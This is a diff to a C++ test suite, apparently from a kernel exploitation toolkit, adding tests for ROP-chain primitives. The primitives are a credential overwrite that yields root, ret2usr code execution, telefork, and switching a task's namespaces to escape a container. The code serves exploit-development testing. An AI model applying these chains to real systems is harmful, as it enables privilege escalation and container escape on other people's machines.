@@ -16,6 +16,7 @@
 
 #pragma once
 
+#include <sched.h>
 #include <unistd.h>
 #include <sys/wait.h>
 #include "test/TestSuite.h"
@@ -23,8 +24,14 @@
 #include <xdk/xdk_device/xdk_device.h>
 #include <xdk/util/HexDump.h>
 #include <xdk/util/error.h>
+#include <xdk/util/Syscalls.h>
 #include <xdk/payloads/RopChain.h>
 #include <xdk/payloads/Payload.h>
+#include <xdk/rip/RopUtils.h>
+
+void ret2usr_kernel() {
+    _exit(133);
+}
 
 class RopActionTests: public TestSuite {
     XdkDevice* xdk_;
@@ -75,14 +82,16 @@ public:
     bool ExecuteRopAction(RopActionId id, std::vector<uint64_t> arguments = {}, uint64_t min_stack = 0, uint64_t max_stack = 4096, uint64_t buf_size = 4096) {
         auto rop = GetRopChain();
         rop.AddRopAction(id, arguments);
-        return ExecuteRopChain(rop);
+        return ExecuteRopChain(rop, min_stack, max_stack, buf_size);
     }
 
     TEST_METHOD(commitCredsTest, "COMMIT_INIT_TASK_CREDS is working") {
+        auto orig_uid = getuid();
         setuid(1);
         ASSERT_EQ(1, getuid());
-        ExecuteRopAction(RopActionId::COMMIT_INIT_TASK_CREDS, {}, 100, 128);
+        ExecuteRopAction(RopActionId::COMMIT_INIT_TASK_CREDS, {}, 100, 512);
         ASSERT_EQ(0, getuid());
+        setuid(orig_uid);
     }
 
     TEST_METHOD(winTargetWorks, "win_target is working") {
@@ -111,13 +120,50 @@ public:
             ASSERT_EQ(i == target_offs ? new_value : 0, *((uint64_t*)&buf_leak[i]));
     }
 
+    bool check_fork(int expected_exitcode) {
+        int status;
+        return wait(&status) != -1 && WIFEXITED(status) && WEXITSTATUS(status) == expected_exitcode;
+    }
+
     TEST_METHOD(teleforkTest, "TELEFORK is working, its stack usage is in expected range") {
         if (ExecuteRopAction(RopActionId::TELEFORK, {10}, 400, 2600))
             exit(123);
 
         // TODO: this can conflict with other user-space fork calls, use a better design?
-        int status;
-        if (wait(&status) == -1 || !WIFEXITED(status) || WEXITSTATUS(status) != 123)
+        if (!check_fork(123))
             throw ExpKitError("No child was forked.");
+    }
+
+    TEST_METHOD(ret2usrTest, "RET2USR works") {
+        if (!fork()) {
+            auto rop = GetRopChain();
+            RopUtils::Ret2Usr(rop, (void*)&ret2usr_kernel);
+            ExecuteRopChain(rop);
+        } else if (!check_fork(133))
+            throw ExpKitError("Could not run code via RET2USR.");
+    }
+
+    TEST_METHOD(switchTaskNamespacesTest, "SWITCH_TASK_NAMESPACES works") {
+        // fork so we won't ruin the test runner's namespace
+        if (!fork()) {
+          auto orig_ns = Syscalls::readlink("/proc/self/ns/ipc");
+          Log("before unshare %u %u %s", getuid(), getpid(), orig_ns.c_str());
+
+          Syscalls::unshare(CLONE_NEWUSER|CLONE_NEWIPC);
+
+          auto new_ns = Syscalls::readlink("/proc/self/ns/ipc");
+          Log("after unshare %u %u %s", getuid(), getpid(), new_ns.c_str());
+          ASSERT_NE(orig_ns.c_str(), new_ns.c_str());
+
+          auto rop = GetRopChain();
+          rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {(uint64_t)getpid()});
+          ExecuteRopChain(rop, 0, 512);
+
+          auto restored_ns = Syscalls::readlink("/proc/self/ns/ipc");
+          Log("after SWITCH_TASK_NAMESPACES %u %u %s", getuid(), getpid(), restored_ns.c_str());
+          ASSERT_EQ(orig_ns.c_str(), restored_ns.c_str());
+          _exit(0);
+        } else if (!check_fork(0))
+          throw ExpKitError("Fork failed.");
     }
 };
